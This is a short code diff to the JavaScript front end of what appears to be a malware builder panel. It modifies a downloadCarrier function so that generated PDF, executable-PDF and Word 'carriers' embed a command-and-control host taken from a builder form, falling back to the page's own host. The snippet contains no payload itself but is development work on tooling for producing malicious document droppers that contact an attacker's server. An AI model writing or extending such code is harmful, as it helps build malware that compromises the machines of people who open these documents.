@@ -847,6 +847,12 @@ function doCompile() {
 async function downloadCarrier(type) {
   try {
     const params = new URLSearchParams({ type });
+
+    // Always pass the configured C2 host so the carrier embeds the right URL.
+    // Falls back to the current page's host if the builder form hasn't been filled.
+    const configuredHost = document.getElementById('b-host')?.value.trim();
+    if (configuredHost) params.set('c2host', configuredHost);
+
     // Attach PDF customisation fields for document-based carriers
     if (['pdf','pdfexec','word'].includes(type)) {
       const from     = document.getElementById('pdf-from')?.value.trim();
